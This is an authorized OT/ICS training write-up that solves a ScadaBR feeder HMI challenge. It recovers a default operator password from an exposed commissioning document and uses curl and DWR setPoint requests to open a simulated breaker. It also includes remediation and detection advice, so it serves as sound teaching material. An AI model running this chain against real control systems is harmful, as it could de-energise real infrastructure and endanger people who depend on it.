**BLACK-BOX EXPLOITATION WRITEUP**

**ScadaBR - Feeder HMI Default Operator Login**

Authorized OT/ICS Security Training Scenario

| **Document Field** | **Value** |
|----|----|
| Assessment Type | Black-box web and OT process-control assessment |
| Target Platform | ScadaBR 1.2, Apache Tomcat 9, Nginx, MariaDB |
| Process Protocol | Modbus/TCP on internal TCP/1502 |
| Primary Weakness | Exposed commissioning document and unchanged operator credential |
| Difficulty | Easy |
| Document Status | Final |
| Intended Audience | Instructors, evaluators, Red Team participants, and challenge maintainers |

**Important**

Use this procedure only in the authorized challenge environment. The attack path intentionally manipulates a simulated feeder breaker through the legitimate HMI workflow.

# Document Control

| **Item** | **Description** |
|----|----|
| Purpose | Provide a complete black-box solution beginning with only the target address. |
| Scope | Reconnaissance, content discovery, credential recovery, HMI authentication, breaker manipulation, impact validation, reset, and remediation. |
| Out of scope | Direct database modification, direct remote access to loopback Modbus/TCP, destructive host actions, persistence, and denial of service. |
| Assumption | The participant is authorized to test the assigned challenge target. |
| Target placeholder | \<TARGET-IP\> or http://\<TARGET-IP\> |

# Contents

> 1\. Executive Summary
>
> 2\. Assessment Objective and Rules
>
> 3\. Target Architecture and Attack Surface
>
> 4\. Black-Box Methodology
>
> 5\. Phase 1 - Reconnaissance
>
> 6\. Phase 2 - Web Content Discovery
>
> 7\. Phase 3 - Credential Recovery
>
> 8\. Phase 4 - Authentication and Session Validation
>
> 9\. Phase 5 - HMI and Process-Point Analysis
>
> 10\. Phase 6 - Breaker Manipulation
>
> 11\. Phase 7 - Operational Impact Validation
>
> 12\. Automated Attack Script
>
> 13\. Evidence and Reporting
>
> 14\. Root Cause and Risk Analysis
>
> 15\. Remediation Guidance
>
> 16\. MITRE ATT&CK for ICS Mapping
>
> 17\. Reset and Post-Test Validation
>
> Appendix A - Command Reference
>
> Appendix B - Expected Output Reference
>
> Appendix C - Common Pitfalls
>
> Conclusion

# 1. Executive Summary

This assessment evaluates a ScadaBR-based feeder control environment from a black-box perspective. The tester begins with only the target IP address and no credentials, internal documentation, or process-point identifiers.

The exposed HTTP service provides access to a root robots file that discloses an engineering-document path. A commissioning handover record within that archive contains an initial operator username and password that were never rotated. The account remains active and retains permission to write the breaker command point.

After authenticating through the normal ScadaBR login workflow, the tester can issue an OPEN command to Breaker 52A. ScadaBR forwards the write to the internal Modbus/TCP feeder process. The breaker state transitions from CLOSED to OPEN and the feeder load falls from approximately 280-360 A to 0-5 A.

Primary finding: A web-accessible commissioning document discloses a still-valid operator credential with live breaker-control permission.

## 1.1 Final Black-Box Findings

| **Finding**                | **Observed Result**                   |
|----------------------------|---------------------------------------|
| Participant-facing service | Nginx HTTP service on TCP/80          |
| Exposed clue               | /robots.txt                           |
| Sensitive archive          | /engineering-docs/                    |
| Credential source          | FEEDER-01-Commissioning-Handover.html |
| Compromised account        | feeder.operator                       |
| Writable point             | BREAKER_52A_CMD                       |
| Malicious operation        | OPEN / binary value 0                 |
| Confirmed process state    | BREAKER_52A_STATUS = OPEN             |
| Operational impact         | FEEDER_11KV_LOAD = 0-5 A              |

# 2. Assessment Objective and Rules

The objective is to determine whether a remote unauthenticated user can discover valid access material, authenticate to the HMI, and perform an unauthorized process-control action without directly accessing internal services.

## 2.1 Starting Conditions

- The tester receives only the target address.

- No username or password is supplied.

- The tester has network access to participant-facing TCP/80.

- Tomcat, MariaDB, and Modbus/TCP are expected to remain loopback-only.

- The intended attack must use the exposed web application and legitimate HMI workflow.

## 2.2 Rules of Engagement

- Use the assigned target only.

- Do not modify challenge files, system services, or the database directly.

- Do not connect directly to MariaDB.

- Do not attempt remote access to TCP/1502; the Modbus service is intentionally local.

- Do not conduct denial-of-service activity.

- Restore the process after validation when instructed.

# 3. Target Architecture and Attack Surface

The participant interacts with Nginx over TCP/80. Nginx proxies requests to ScadaBR on local TCP/8080. ScadaBR communicates with the feeder process over local Modbus/TCP on TCP/1502 and uses MariaDB on TCP/3306.

Attacker / Participant Host\
\|\
\| HTTP TCP/80\
v\
Nginx\
\|\
\| Local HTTP TCP/8080\
v\
ScadaBR / Tomcat\
\| \|\
\| +--\> MariaDB TCP/3306 (loopback)\
\|\
+--\> Modbus/TCP TCP/1502 (loopback)\
\|\
+--\> Breaker command, breaker status, feeder load

## 3.1 Process Points

| **Point** | **Purpose** | **Access** | **Meaning** |
|----|----|----|----|
| BREAKER_52A_CMD | Requested breaker command | Read/write | OPEN = 0, CLOSE = 1 |
| BREAKER_52A_STATUS | Actual breaker position | Read-only | OPEN = 0, CLOSED = 1 |
| FEEDER_11KV_LOAD | Measured feeder current | Read-only | Approximately 280-360 A energized; 0-5 A de-energized |

# 4. Black-Box Methodology

The assessment follows a controlled sequence that minimizes unnecessary traffic and preserves the intended solve path.

> 1\. Confirm basic network reachability and enumerate the participant-facing service.
>
> 2\. Inspect the root web service and common discovery files.
>
> 3\. Follow exposed references to engineering documentation.
>
> 4\. Extract the commissioning credential from the published handover record.
>
> 5\. Authenticate through the normal ScadaBR login endpoint.
>
> 6\. Review the assigned feeder view and identify writable versus read-only points.
>
> 7\. Issue an OPEN command to the writable breaker point.
>
> 8\. Confirm the process transition and operational impact.
>
> 9\. Record evidence, restore the process, and validate the clean baseline.

# 5. Phase 1 - Reconnaissance

## 5.1 Define the Target

export TARGET=\<TARGET-IP\>

When using a full origin rather than an IP address, use the following form:

export TARGET=http://\<TARGET-IP\>

## 5.2 Enumerate Services

nmap -n -Pn -sV -p- --min-rate 1000 "\$TARGET"

Expected participant-facing result:

80/tcp open http nginx

TCP/8080, TCP/1502, and TCP/3306 should not be externally reachable. Their absence from the remote scan confirms that the exercise must proceed through the published HMI path.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/ScadaBR-Feeder-HMI-Default-Operator-Login/media/image1.png" title="Figure 1" style="width:6.55in;height:4.90611in" alt="Figure 1. Kali reconnaissance showing the target services and the HTTP redirect toward the ScadaBR application." />

*Figure 1. Kali reconnaissance showing the target services and the HTTP redirect toward the ScadaBR application.*

The screenshot confirms the externally reachable web service on TCP/80 and the redirect to /ScadaBR/. TCP/22 is administrative access on the test host and is not used in the intended black-box exploitation path.

## 5.3 Inspect the Root Service

curl -i "http://\$TARGET/"

The response identifies the ScadaBR application or redirects the user toward the HMI path:

http://\<TARGET-IP\>/ScadaBR/

# 6. Phase 2 - Web Content Discovery

## 6.1 Inspect robots.txt

curl -fsS "http://\$TARGET/robots.txt"

Expected content:

User-agent: \*\
Disallow: /engineering-docs/commissioning/

The Disallow directive is not access control. It reveals the existence of an operational-document location to any user who requests the file.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/ScadaBR-Feeder-HMI-Default-Operator-Login/media/image2.png" title="Figure 2" style="width:6.55in;height:6.14148in" alt="Figure 2. Root HTTP response and robots.txt disclosure revealing /engineering-docs/commissioning/." />

*Figure 2. Root HTTP response and robots.txt disclosure revealing /engineering-docs/commissioning/.*

The robots entry supplies the first sensitive clue. It identifies an engineering-document location but does not prevent a remote user from requesting it.

## 6.2 Enumerate the Engineering Archive

curl -fsS "http://\$TARGET/engineering-docs/"

Review the returned HTML for references to commissioning, feeder handover, or operator-account records.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/ScadaBR-Feeder-HMI-Default-Operator-Login/media/image3.png" title="Figure 3" style="width:6.55in;height:4.60903in" alt="Figure 3. Engineering archive enumeration exposing the Feeder 01 commissioning handover record." />

*Figure 3. Engineering archive enumeration exposing the Feeder 01 commissioning handover record.*

The archive index directly references FEEDER-01-Commissioning-Handover.html, allowing the assessment to continue without brute force or directory guessing.

## 6.3 Retrieve the Handover Record

curl -fsS "http://\$TARGET/engineering-docs/commissioning/FEEDER-01-Commissioning-Handover.html"

The document is an operational handover record for Feeder 01. It contains a temporary operator-account section and an outstanding action to rotate or disable the profile.

# 7. Phase 3 - Credential Recovery

## 7.1 Extract the Credential

curl -fsS "http://\$TARGET/engineering-docs/commissioning/FEEDER-01-Commissioning-Handover.html" \| grep -E 'User ID\|Initial password\|feeder\\operator\|Feeder@123'

Recovered finding:

| **Field**          | **Value**                                           |
|--------------------|-----------------------------------------------------|
| Username           | feeder.operator                                     |
| Initial password   | Feeder@123                                          |
| Assigned privilege | Feeder 01 view and Breaker 52A command              |
| Security issue     | Temporary credential remained enabled and unchanged |

Black-box conclusion: The credential was not guessed or brute-forced. It was obtained from an exposed operational document.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/ScadaBR-Feeder-HMI-Default-Operator-Login/media/image4.png" title="Figure 4" style="width:6.55in;height:5.76303in" alt="Figure 4. Commissioning handover record disclosing the feeder.operator account and unchanged initial password." />

*Figure 4. Commissioning handover record disclosing the feeder.operator account and unchanged initial password.*

The record states that the account remains enabled and must be rotated or disabled after handover. This is the credential-lifecycle failure that enables the attack.

# 8. Phase 4 - Authentication and Session Validation

## 8.1 Browser Authentication

Open:

http://\<TARGET-IP\>/ScadaBR/

Use:

Username: feeder.operator\
Password: Feeder@123

A successful login opens the assigned operator interface rather than returning the login form.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/ScadaBR-Feeder-HMI-Default-Operator-Login/media/image5.png" title="Figure 5" style="width:6.55in;height:3.40122in" alt="Figure 5. ScadaBR authentication using the credential recovered from the exposed handover record." />

*Figure 5. ScadaBR authentication using the credential recovered from the exposed handover record.*

Successful authentication establishes a legitimate ScadaBR session under the feeder.operator profile.

## 8.2 Command-Line Authentication

COOKIE_JAR="\$(mktemp)"\
\
curl -i -sS -c "\$COOKIE_JAR" --data-urlencode 'username=feeder.operator' --data-urlencode 'password=Feeder@123' --data-urlencode 'submit=Login' "http://\$TARGET/ScadaBR/login.htm"

Expected behavior:

- HTTP 302 or 303 redirect after valid credentials.

- A JSESSIONID value is written to the cookie jar.

- An authenticated request to watch_list.shtm does not return the login page.

## 8.3 Validate the Authenticated Session

curl -fsS -b "\$COOKIE_JAR" "http://\$TARGET/ScadaBR/watch_list.shtm"

If the response contains the login form again, the session was not authenticated. A valid session returns an assigned watch list or feeder view.

# 9. Phase 5 - HMI and Process-Point Analysis

## 9.1 Locate the Feeder View

Navigate to the view named:

11 kV Feeder Control - Feeder 01

Record the command point, the actual status point, and the load indication before making any change.

## 9.2 Establish the Baseline

| **Point** | **Expected Baseline** | **Interpretation** |
|----|----|----|
| BREAKER_52A_CMD | CLOSE | The requested state is closed |
| BREAKER_52A_STATUS | CLOSED | The process confirms the breaker is closed |
| FEEDER_11KV_LOAD | Approximately 280-360 A | The feeder is energized |

## 9.3 Distinguish Command from Status

BREAKER_52A_CMD is writable and represents the operator's requested action. BREAKER_52A_STATUS is read-only and represents the process-confirmed position. A short transition delay can occur between issuing a command and observing the final status.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/ScadaBR-Feeder-HMI-Default-Operator-Login/media/image6.png" title="Figure 6" style="width:6.55in;height:3.36038in" alt="Figure 6. Authorized baseline before exploitation: command CLOSE, status CLOSED, and feeder load approximately 315 A." />

*Figure 6. Authorized baseline before exploitation: command CLOSE, status CLOSED, and feeder load approximately 315 A.*

This baseline proves that Feeder 01 is energized before the unauthorized control action.

# 10. Phase 6 - Breaker Manipulation

## 10.1 Manual HMI Method

> 1\. Open the control associated with BREAKER_52A_CMD.
>
> 2\. Select OPEN.
>
> 3\. Confirm the operation when prompted.
>
> 4\. Wait approximately two to three seconds.
>
> 5\. Observe the actual breaker position and feeder load.

## 10.2 Authenticated DWR Method

The supplied attack script uses the same authenticated application path as the HMI. It submits a DWR call to the ScadaBR setPoint method rather than connecting directly to Modbus/TCP.

POST /ScadaBR/dwr/call/plaincall/DataPointDetailsDwr.setPoint.dwr\
\
c0-scriptName=DataPointDetailsDwr\
c0-methodName=setPoint\
c0-param0=number:2\
c0-param1=number:2\
c0-param2=boolean:false

The boolean false value represents OPEN for BREAKER_52A_CMD in this challenge.

## 10.3 Execute the Packaged Script

chmod +x Red-Team-Attack-Script.sh\
\
./Red-Team-Attack-Script.sh --target "http://\$TARGET"

On a resource-constrained attacker host without Nmap:

./Red-Team-Attack-Script.sh --target "http://\$TARGET" --no-nmap

# 11. Phase 7 - Operational Impact Validation

## 11.1 Expected Exploited State

| **Point** | **Expected Result** | **Significance** |
|----|----|----|
| BREAKER_52A_CMD | OPEN / 0 | The malicious command was accepted |
| BREAKER_52A_STATUS | OPEN / 0 | The physical process followed the request |
| FEEDER_11KV_LOAD | 0-5 A | The feeder is de-energized |

## 11.2 Instructor-Side Protocol Validation

sudo /opt/ot-challenges/scadabr-feeder-default-login/venv/bin/python /opt/ot-challenges/scadabr-feeder-default-login/modbus-feeder/modbus_test.py

Expected output in the exploited state:

BREAKER_52A_CMD=0 (OPEN)\
BREAKER_52A_STATUS=0 (OPEN)\
FEEDER_11KV_LOAD=\<0-5\> A

This local check is an instructor or administrator validation method. It is not required for a remote black-box participant because TCP/1502 is loopback-only.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/ScadaBR-Feeder-HMI-Default-Operator-Login/media/image7.png" title="Figure 7" style="width:6.55in;height:3.22383in" alt="Figure 7. Confirmed exploited state: breaker command OPEN, breaker status OPEN, and feeder current reduced to 3 A." />

*Figure 7. Confirmed exploited state: breaker command OPEN, breaker status OPEN, and feeder current reduced to 3 A.*

The HMI confirms both command acceptance and process impact. The residual current lies within the expected 0-5 A de-energized range.

## 11.3 Interpretation of process_verified=0

When the attack script runs from Kali or another remote participant host, it may print process_verified=0. This does not mean the HTTP attack failed. It means the remote host cannot execute the local Modbus validation client. The server-side HMI, local test client, logs, or packet capture must be used to verify the final process state.

# 12. Automated Attack Script

The supplied Red-Team-Attack-Script.sh version 2.1.0 automates the intended black-box workflow while preserving the application-layer attack path.

## 12.1 Script Workflow

> 1\. Normalizes an IP address or ScadaBR URL into an origin and application base URL.
>
> 2\. Optionally confirms TCP/80 with Nmap.
>
> 3\. Requests the root robots file.
>
> 4\. Confirms the engineering-document clue.
>
> 5\. Retrieves the archive and commissioning handover record.
>
> 6\. Parses the username and initial password from the HTML.
>
> 7\. Authenticates to ScadaBR and stores the JSESSIONID cookie.
>
> 8\. Validates that the session can access an authenticated page.
>
> 9\. Submits the authenticated DataPointDetailsDwr.setPoint request.
>
> 10\. Waits for the process transition.
>
> 11\. Performs local Modbus validation when executed on the challenge server.

## 12.2 Supported Options

| **Option** | **Purpose** |
|----|----|
| --target URL_OR_IP | Specify an IP, origin, ScadaBR path, or ScadaBR page URL |
| --username USER | Override the username recovered from the handover |
| --password PASS | Override the recovered password |
| --point-id ID | Specify the BREAKER_52A_CMD data-point ID; default 2 |
| --component-id ID | Specify the DWR component value; default 2 |
| --restore | Send CLOSE instead of OPEN |
| --discover-only | Stop after recovering the credential |
| --no-nmap | Skip the optional Nmap service check |
| --help | Display usage information |

## 12.3 Discovery-Only Mode

./Red-Team-Attack-Script.sh --target "http://\$TARGET" --discover-only

Use this mode to validate only the document-exposure and credential-discovery portion without changing the process.

## 12.4 Restore Mode

./Red-Team-Attack-Script.sh --target "http://\$TARGET" --restore

Restore mode authenticates through the same application path and requests CLOSE for BREAKER_52A_CMD.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/ScadaBR-Feeder-HMI-Default-Operator-Login/media/image8.png" title="Figure 8" style="width:6.55in;height:3.86592in" alt="Figure 8. Packaged attack script demonstrating discovery-only credential recovery and authenticated restore through the ScadaBR workflow." />

*Figure 8. Packaged attack script demonstrating discovery-only credential recovery and authenticated restore through the ScadaBR workflow.*

The remote script reports process_verified=0 because the Kali host cannot execute the loopback-only Modbus verification client. The HMI and server-side telemetry provide the final process confirmation.

# 13. Evidence and Reporting

## 13.1 Minimum Evidence Set

| **Evidence Item**    | **Required Detail**                              |
|----------------------|--------------------------------------------------|
| Service discovery    | TCP/80 exposed through Nginx                     |
| Discovery clue       | Root robots.txt path disclosure                  |
| Sensitive artifact   | Commissioning handover document URL              |
| Credential           | Recovered operator username and password         |
| Authentication       | Successful ScadaBR redirect/session              |
| Control request      | Authenticated setPoint invocation for point ID 2 |
| Process confirmation | Breaker status OPEN                              |
| Operational impact   | Feeder load reduced to 0-5 A                     |
| Reset confirmation   | Breaker CLOSED and load restored                 |

## 13.2 Suggested Finding Statement

A web-accessible commissioning record disclosed an unchanged temporary operator credential. The account remained enabled with permission to modify the Breaker 52A command point. An unauthenticated remote user could discover the credential, log in through the normal ScadaBR interface, and open the breaker, reducing feeder current to a residual 0-5 A.

## 13.3 Severity Rationale

The issue should be treated as high impact in the context of the challenge because it enables unauthorized process manipulation using valid credentials. The attack does not require administrative access, direct protocol access, or exploitation of a memory-safety defect.

| **Risk Factor** | **Assessment** |
|----|----|
| Attack complexity | Low |
| Authentication initially required | No; credential is externally discoverable |
| Privileges obtained | Operator-level write access to breaker command |
| User interaction | None |
| Process impact | Feeder de-energization |
| Detectability | Visible in HMI, audit logs, Nginx logs, and Modbus telemetry |

# 14. Root Cause and Risk Analysis

## 14.1 Root Causes

> 1\. The commissioning password was not rotated after handover.
>
> 2\. The temporary operator account was not disabled.
>
> 3\. Credential-bearing engineering documentation was published under a web-accessible document root.
>
> 4\. The temporary account retained write permission to an operational breaker command.

## 14.2 Why the Attack Is Effective

The request appears legitimate to the application because it uses a valid account, a valid session, and the normal HMI control method. The weakness is therefore not a protocol parser error; it is a failure of credential lifecycle, document handling, and least privilege.

## 14.3 Security Boundary Failure

Internal services are correctly restricted to loopback, but that control does not prevent misuse through the trusted HMI. Once the operator credential is compromised, ScadaBR becomes an authorized proxy for the attacker's process-control command.

# 15. Remediation Guidance

## 15.1 Immediate Actions

- Disable the feeder.operator commissioning account.

- Rotate all initial and vendor-supplied passwords.

- Remove credential-bearing documents from web-accessible storage.

- Review recent authentications and breaker operations associated with temporary accounts.

- Restore the breaker and verify the energized baseline.

## 15.2 Preventive Controls

- Enforce a commissioning account expiration date.

- Require password rotation before operational acceptance.

- Use separate documentation storage with authenticated role-based access.

- Apply least privilege so temporary accounts cannot operate production control points.

- Restrict HMI access to approved management or operator networks.

- Use multifactor authentication for remote HMI access where supported.

- Maintain an account inventory and periodic enabled-account review.

## 15.3 Detection and Monitoring

- Alert on authentication by temporary or commissioning accounts.

- Alert on breaker command writes from unusual source addresses.

- Correlate Nginx access, ScadaBR authentication, DWR point writes, Modbus events, breaker transitions, and feeder-load changes.

- Flag access to sensitive engineering-document paths from participant or untrusted networks.

- Retain application, reverse-proxy, and process telemetry for incident reconstruction.

# 16. MITRE ATT&CK for ICS Mapping

| **Tactic** | **Technique** | **Procedure in This Scenario** |
|----|----|----|
| Initial Access (TA0108) | Insecure Credentials: Default Credentials (T1694.001) | The tester recovers and uses an unchanged initial password for the commissioning operator account. |
| Initial Access (TA0108) | Valid Accounts (T0859) | The recovered account authenticates through the normal ScadaBR workflow. |
| Impair Process Control (TA0106) | Manipulation of Control (T0831) | The authenticated user changes the writable breaker command and causes the process state to transition. |
| Impair Process Control (TA0106) | Unauthorized Message: Command Message (T1692.001) | The attacker issues a valid HMI command message without operational authorization. |

# 17. Reset and Post-Test Validation

## 17.1 Instructor Reset

sudo ./reset-challenge.sh

## 17.2 Validate the Restored Baseline

sudo ./validate.sh

Expected restored state:

BREAKER_52A_CMD: CLOSE\
BREAKER_52A_STATUS: CLOSED\
FEEDER_11KV_LOAD: approximately 280-360 A

A successful reset should also remove adversary activity from the participant-ready baseline and restore the approved evidence state.

## 17.3 Restore Through the Application Path

./Red-Team-Attack-Script.sh --target "http://\$TARGET" --restore

Use the instructor reset script for a complete clean baseline. Use attack-script restore mode when demonstrating that the same authenticated HMI path can close the breaker.

# Appendix A - Command Reference

| **Task** | **Command** |
|----|----|
| Set target | export TARGET=\<TARGET-IP\> |
| Scan services | nmap -n -Pn -sV -p- --min-rate 1000 "\$TARGET" |
| Read robots.txt | curl -fsS "http://\$TARGET/robots.txt" |
| Open archive | curl -fsS "http://\$TARGET/engineering-docs/" |
| Retrieve handover | curl -fsS "http://\$TARGET/engineering-docs/commissioning/FEEDER-01-Commissioning-Handover.html" |
| Run attack | ./Red-Team-Attack-Script.sh --target "http://\$TARGET" |
| Run without Nmap | ./Red-Team-Attack-Script.sh --target "http://\$TARGET" --no-nmap |
| Discovery only | ./Red-Team-Attack-Script.sh --target "http://\$TARGET" --discover-only |
| Restore through HMI | ./Red-Team-Attack-Script.sh --target "http://\$TARGET" --restore |
| Reset challenge | sudo ./reset-challenge.sh |
| Validate challenge | sudo ./validate.sh |

# Appendix B - Expected Output Reference

## B.1 Successful Remote Attack

\[INFO\] ScadaBR accepted the discovered operator credential\
\[ATTACK\] Sending authenticated OPEN command to BREAKER_52A_CMD...\
\[INFO\] ScadaBR accepted the authenticated breaker-control request\
ATTACK_SENT version=2.1.0 user=feeder.operator point=BREAKER_52A_CMD point_id=2 command=OPEN value=0 process_verified=0

process_verified=0 is expected when the script runs remotely and the local Modbus validation files are unavailable.

## B.2 Successful Local Attack Validation

BREAKER_52A_CMD=0 (OPEN)\
BREAKER_52A_STATUS=0 (OPEN)\
FEEDER_11KV_LOAD=\<0-5\> A\
\
ATTACK_COMPLETE version=2.1.0 user=feeder.operator point=BREAKER_52A_CMD point_id=2 command=OPEN value=0 process_verified=1

## B.3 Successful Restore

BREAKER_52A_CMD=1 (CLOSE)\
BREAKER_52A_STATUS=1 (CLOSED)\
FEEDER_11KV_LOAD=\<energized value\> A

# Appendix C - Common Pitfalls

- Checking only /ScadaBR/robots.txt and missing the root /robots.txt file.

- Treating robots.txt as an authorization control.

- Attempting brute force instead of reviewing the handover document.

- Trying to write BREAKER_52A_STATUS, which is read-only.

- Assuming the command failed before the process transition delay completes.

- Attempting remote access to TCP/1502 or TCP/3306.

- Interpreting process_verified=0 as an HTTP attack failure.

- Failing to restore the breaker after the assessment.

# Conclusion

The challenge demonstrates how routine commissioning weaknesses can become a direct process-control risk. A single exposed document provided an unchanged credential for an account that retained operational write permission. By following only externally observable information and the legitimate ScadaBR workflow, a remote user could open Breaker 52A and de-energize Feeder 01.

The key defensive lesson is that restricting Modbus and database services to localhost is necessary but insufficient. Credential lifecycle, documentation exposure, least privilege, and application-level monitoring are equally important controls.

